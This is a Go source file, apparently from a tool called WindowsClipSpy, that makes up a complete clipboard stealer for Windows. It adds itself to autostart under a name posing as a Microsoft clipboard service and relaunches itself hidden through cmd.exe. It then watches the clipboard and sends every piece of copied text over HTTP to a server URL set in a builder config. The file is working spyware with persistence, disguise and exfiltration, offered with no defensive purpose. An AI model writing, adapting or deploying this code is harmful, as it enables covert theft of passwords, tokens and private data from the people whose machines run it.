package main

import (
	"context"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/PiterWeb/WindowsClipSpy/builder"
	"github.com/emersion/go-autostart"
	"golang.design/x/clipboard"
)

func main() {

	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}

	exPath := filepath.Dir(ex)

	var config = builder.GetConfig()

	var Filename string = config.Filename

	app := &autostart.App{
		Name:        "MSClipboard",
		DisplayName: "Clipboard Internal Microsoft Windows",
		Exec:        []string{"cmd.exe", "/C", "start", "/b", exPath + Filename},
	}

	if app.IsEnabled() {

		err = clipboard.Init()
		if err != nil {
			panic(err)
		}

		ch := clipboard.Watch(context.TODO(), clipboard.FmtText)
		for data := range ch {
			var clipboardContent string = string(data)
			sendClipboard(clipboardContent, config)
		}

	} else {
		if err := app.Enable(); err != nil {
			panic(err)
		}

		cmd := exec.Command("cmd.exe", "/C", "start", "/b", exPath+Filename)

		err = cmd.Start()

		if err != nil {
			panic(err)
		}

	}

}

func sendClipboard(clipboardContent string, config builder.Config) {

	var Url string = config.Url
	var Method string = config.Method

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, _ := http.NewRequest(Method, Url, strings.NewReader(clipboardContent))

	client.Do(req)

}
